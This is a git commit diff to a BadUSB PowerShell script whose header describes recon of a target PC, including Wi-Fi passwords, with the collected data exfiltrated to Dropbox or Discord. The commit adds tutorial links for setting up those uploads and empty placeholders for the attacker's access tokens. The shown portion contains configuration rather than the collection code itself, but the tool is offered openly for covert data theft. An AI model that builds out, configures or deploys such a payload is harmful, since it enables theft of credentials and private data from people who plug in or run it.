eecb9890aa5ee12ac1ef693df3834b0ee82c8f6c
Gvte-Kali <132758165+Gvte-Kali@users.noreply.github.com>
2024-01-27 16:43:54 +0100

    Update 4dv4nc3d_R3c0n.ps1

--- BadUSB/4dv4nc3d_R3c0n/4dv4nc3d_R3c0n.ps1
+++ BadUSB/4dv4nc3d_R3c0n/4dv4nc3d_R3c0n.ps1
@@ -1,3 +1,4 @@
+                                                                                                                                                                                                                                        
 <#
 .SYNOPSIS
 	This is an advanced recon of a target PC and exfiltration of that data.
@@ -5,6 +6,10 @@
 	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
 	All of the gather information is formatted neatly and output to a file.
 	That file is then exfiltrated to cloud storage via Dropbox.
+.Link
+      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
+      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
+      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
 #>
 
 ############################################################################################################################################################
@@ -23,6 +28,14 @@ $FileName = "$FolderName.txt"
 $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
+
+############################################################################################################################################################
+
+# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
+
+#$db = ""
+
+#$dc = ""
 
 ############################################################################################################################################################
 
